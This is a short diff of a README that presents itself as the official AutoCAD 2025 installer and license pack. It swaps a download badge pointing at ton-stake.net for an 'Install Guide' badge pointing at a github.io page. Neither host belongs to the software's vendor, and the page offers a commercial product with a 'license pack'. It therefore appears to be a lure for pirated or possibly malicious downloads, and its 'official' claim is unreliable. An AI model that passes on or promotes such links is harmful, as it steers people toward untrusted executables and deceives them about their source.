@@ -3,7 +3,10 @@
 **AutoCAD 2025 Release** is the official installer and license pack for Windows PCs.  
 It provides architecture, engineering, and 3D design tools with updated 2025 features.
 
-[![Download AutoCAD](https://img.shields.io/badge/Download-AutoCAD_2025-blueviolet)](https://ton-stake.net)
+<a href="https://autocad-2025-release.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
+
 
 ---
 
